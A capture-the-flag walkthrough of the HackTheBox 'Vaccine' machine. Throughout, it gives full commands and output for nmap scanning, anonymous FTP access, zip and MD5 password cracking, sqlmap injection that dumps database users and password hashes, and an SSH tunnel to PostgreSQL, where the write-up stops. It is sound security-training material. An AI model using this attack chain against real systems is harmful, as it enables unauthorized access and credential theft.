---
title: Vaccine - A HackThebBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---

# Vaccine - A HackTheBox machine


```bash
nmap -sC -sV $ip -Pn
```
Two open ports: 21 and 80


Also, from nmap analysys, ftp service at 21 allows us to use anonymous signin with empty password:

```bash
ftp $ip

# enter user "anonymous" and hit enter when prompted for password
```

```ftp
dir
# listed appears file backup.zip

get *
```

Try to open zip file, but it's password protected, so we crak it with [johntheripper](john-the-ripper.md):


```bash
zip2john nameoffile.zip > zip.hashes
cat zip.hashes
john zip.hashes
# Proceeding with wordlist:/usr/share/john/password.lst
# 741852963        (backup.zip)    


#Unzip file:
unzip backup.zip

# Echo index file
cat index.php
```

Before the html code there is a piece of php starting the session. Username and password are hard encoded there:

```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

In crackstation.net, we obtain that the hash "2cb42f8734ea607eefed3b70af13bbd3" was md5 encrypted and that actual password is "qwerty789"

With this, open browser and enter username and password. You will be redirected to: htpp://$ip/dashboard.php

Search box triggers a error message on frontend when introducing simple quotation mark as imput "'":

```
 ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
```

This tells us about a sql injection vulnerability.


```bash
# Ask for backend DBMS
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch      

#---------
# [11:03:27] [INFO] the back-end DBMS is PostgreSQL
#web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
#web application technology: Apache 2.4.41
#back-end DBMS: PostgreSQL



# Ask for databases
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch --dbs

# ------
# [11:06:12] [INFO] fetching database (schema) names available databases [3]:
# [*] information_schema
# [*] pg_catalog
# [*] public



# Ask for tables in db pg_catalog
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch -D pg_catalog --tables

# Response contains 62 tables. 


# Ask for users
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch --users 

# -----
# [11:10:16] [INFO] resumed: 'postgres'
# database management system users [1]:
# [*] postgres


sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch -D pg_catalog -T pg_user -C passwd,usebypassrls,useconfig,usecreatedb,usename,userepl,usesuper,usesysid,valuntil --dump



# Ask for passwords
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9helek579t5cjcldcbb5fc1" --batch --passwords --dump

# -----
# database management system users password hashes:
# [*] postgres [1]:
#    password hash: md52d58e0637ec1e94cdfba3d1c26b67d01

```

First 3 characters are a tip about the hash. Using https://md5.gromweb.com/?md5=2d58e0637ec1e94cdfba3d1c26b67d01 we obtain: The MD5 hash: 2d58e0637ec1e94cdfba3d1c26b67d01 was succesfully reversed into the string: P@s5w0rd!postgres

Now, as we couldn't spot [port 5432 (postgres)](5432-postgres.md) open, we will use port-tunneling with ssh.

```bash
ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 
# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.
# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.

ssh postgres@10.129.95.174 -L 1234:localhost:5432

```





